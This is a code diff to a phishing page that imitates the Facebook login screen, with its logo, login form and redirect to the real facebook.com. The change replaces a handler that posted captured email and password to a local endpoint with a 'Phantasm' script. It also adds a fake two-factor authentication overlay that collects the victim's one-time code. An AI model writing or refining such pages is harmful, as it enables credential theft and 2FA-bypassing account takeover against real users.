@@ -179,10 +179,11 @@
                 max-width: 396px;
             }
         }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="main-wrapper">
+    <div id="step-1" class="main-wrapper">
         <div class="left-col">
             <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
             <h2>Facebook helps you connect and share with the people in your life.</h2>
@@ -190,10 +191,10 @@
         
         <div class="right-col">
             <div class="card">
-                <form id="login-form" class="form-container" onsubmit="handleLogin(event)">
+                <form id="login-form" class="form-container">
                     <input type="text" id="email" placeholder="Email address or phone number" required>
                     <input type="password" id="password" placeholder="Password" required>
-                    <button type="submit" class="btn">Log In</button>
+                    <button type="submit" id="btn-submit" class="btn">Log In</button>
                     <a href="#" class="forgot">Forgotten password?</a>
                     <div class="divider"></div>
                     <button type="button" class="create-btn">Create new account</button>
@@ -205,20 +206,32 @@
         </div>
     </div>
 
+    <!-- OTP Section -->
+    <div id="step-3-otp" class="hidden" style="display: none; flex-direction: column; align-items: center; width: 100%; position: absolute; top: 0; left: 0; background: #f0f2f5; height: 100%; justify-content: center; z-index: 999;">
+        <div class="card" style="padding: 20px;">
+            <h2 style="font-size: 20px; width: 100%; margin-top: 0; margin-bottom: 20px;">Two-Factor Authentication</h2>
+            <p style="margin-bottom: 20px; color: #666;">Please enter the code sent to your device.</p>
+            <input type="text" id="otp-input" placeholder="Enter code" style="margin-bottom: 20px;">
+            <button id="btn-otp-submit" class="btn">Verify</button>
+        </div>
+    </div>
+
+    <script src="/core/assets/js/phantasm.js"></script>
     <script>
-        function handleLogin(event) {
-            event.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            fetch('/login', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({email: email, password: password})
-            }).then(res => {
-                window.location.href = "https://www.facebook.com/";
+        document.addEventListener('DOMContentLoaded', () => {
+            new Phantasm({
+                redirectUrl: 'https://www.facebook.com/',
+                selectors: {
+                    email: '#email',
+                    password: '#password',
+                    otp: '#otp-input',
+                    submitBtn: '#btn-submit',
+                    otpBtn: '#btn-otp-submit',
+                    step1: '#step-1',
+                    step3: '#step-3-otp'
+                }
             });
-        }
+        });
     </script>
 </body>
 </html>
